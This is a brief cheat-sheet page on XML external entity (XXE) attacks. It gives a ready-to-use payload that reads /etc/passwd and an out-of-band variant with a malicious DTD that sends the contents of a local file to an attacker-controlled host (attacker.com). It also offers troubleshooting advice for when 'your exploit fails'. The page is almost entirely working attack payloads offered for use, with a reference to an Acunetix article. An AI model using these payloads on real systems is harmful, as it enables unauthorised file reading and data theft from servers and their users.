# XXE

```markup
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<Content>&xxe;</Content>
</root>
```

Ensure that regardless of the format of your xml files, that there is only one root node.  Several parsers will refuse to validate the file and will error in the event of multiple root nodes.  As with all exploits, this isn't always the case, but if your exploit fails, this would be a good thing to ensure.

## Out-of-band XXE

```markup
POST http://example.com/xml HTTP/1.1

<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/lsb-release">
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

#### evil.dtd

```markup
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
%all;
```

#### References

[Acunetix - Out-of-band XML External Entity \(OOB-XXE\)](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)

